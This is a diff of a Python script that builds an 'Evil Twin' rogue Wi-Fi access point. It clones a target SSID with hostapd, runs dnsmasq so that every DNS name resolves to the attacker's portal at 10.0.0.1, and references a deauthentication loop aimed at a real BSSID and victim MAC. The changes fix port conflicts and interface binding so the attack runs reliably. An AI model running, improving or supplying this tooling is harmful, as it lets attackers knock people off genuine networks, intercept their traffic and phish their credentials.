@@ -1,6 +1,7 @@
 import subprocess, time
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq
 from threading import Thread, Event
+import os
 
 # Event to stop deauth thread
 _deauth_stop = Event()
@@ -8,13 +9,16 @@ _deauth_stop = Event()
 
 def create_evil_ap(ap_info, iface):
     """
-    Launch hostapd and dnsmasq to create an open Evil Twin AP.
-    ap_info: dict with SSID and Channel
+    Launch hostapd and dnsmasq to create an open Evil Twin AP,
+    binding dnsmasq only to the AP interface to avoid port conflicts.
     """
     print("Creating Evil Twin AP...")
-    ssid = ap_info['SSID']
+    ssid    = ap_info['SSID']
     channel = ap_info['Channel']
-    config = f"""
+
+    # 1) Write hostapd config
+    config_path = '/tmp/evil_hostapd.conf'
+    hostapd_conf = f"""
 interface={iface}
 ssid={ssid}
 channel={channel}
@@ -22,25 +26,46 @@ hw_mode=g
 auth_algs=1
 ignore_broadcast_ssid=0
 """
-    config_path = '/tmp/evil_hostapd.conf'
     with open(config_path, 'w') as f:
-        f.write(config)
-    # Run hostapd in background
-    subprocess.Popen(
-        ['hostapd', '-B', config_path],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
-    # Start dnsmasq for DHCP/DNS
+        f.write(hostapd_conf)
+
+    # 2) Clean up any previous IP configuration on the interface and set a static IP
+    subprocess.run(['ip','addr','del','10.0.0.1/24','dev',iface], check=False)
+    subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface], check=False)
+
+    # 3) Stop any existing dnsmasq instances to avoid conflicts
+    subprocess.run(['pkill', '-f', 'dnsmasq'], check=False)
+
+    # 4) Start dnsmasq, binding to that single IP/interface
     subprocess.Popen([
         'dnsmasq',
+        # Only serve on our AP interface:
         f'--interface={iface}',
+        '--bind-interfaces',
+        # Use our AP IP for DNS answers:
+        '--listen-address=10.0.0.1',
+        # DHCP range:
         '--dhcp-range=10.0.0.10,10.0.0.100,12h',
+        # Don’t read /etc/resolv.conf, but forward queries to Google:
         '--no-resolv',
         '--server=8.8.8.8',
-        '--address=/#/10.0.0.1'
-    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    print(f"Evil AP '{ssid}' launched (open) on {iface}")
+        # Redirect all hostnames to our portal:
+        '--address=/#/10.0.0.1',
+    ])#, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    print("dnsmasq started, serving DHCP and DNS")
+
+    # 2) Start hostapd in background
+    # subprocess.Popen(
+    #     ['hostapd', config_path],
+    #     stdout=subprocess.DEVNULL,
+    #     stderr=subprocess.DEVNULL
+    # )
+    subprocess.Popen(
+        ['hostapd', config_path]
+    )
+
+    print(f"Evil AP '{ssid}' launched (open) on {iface} at 10.0.0.1")
 
 
 def _deauth_loop(real_bssid, victim_mac, iface):
